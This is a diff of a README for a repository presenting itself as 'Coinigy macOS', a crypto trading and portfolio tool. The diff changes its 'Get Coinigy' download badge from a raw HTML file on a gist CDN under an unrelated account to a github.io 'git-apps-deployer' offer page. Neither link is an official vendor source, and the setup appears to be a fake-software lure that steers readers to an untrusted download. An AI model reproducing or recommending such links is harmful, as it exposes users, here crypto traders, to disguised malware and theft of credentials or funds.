@@ -3,7 +3,7 @@
 **Coinigy macOS** is a professional crypto trading and portfolio management platform 🍏📊.  
 It connects to 45+ exchanges, providing unified trading, portfolio tracking, and advanced charting tools — all in one intuitive interface.  
 
-[![Get Coinigy](https://img.shields.io/badge/Get%20Coinigy-MacOS-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/freedeerreaderlife-droid/67cc63e9eb71e06727fd1507b0c7189b/raw/833a145849ef5457877362113352be3bc0c5e52e/app.html)
+[![Get Coinigy](https://img.shields.io/badge/Get%20Coinigy-MacOS-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://git-apps-deployer.github.io/.github/?offer=Coinigy)
 
 ---
 
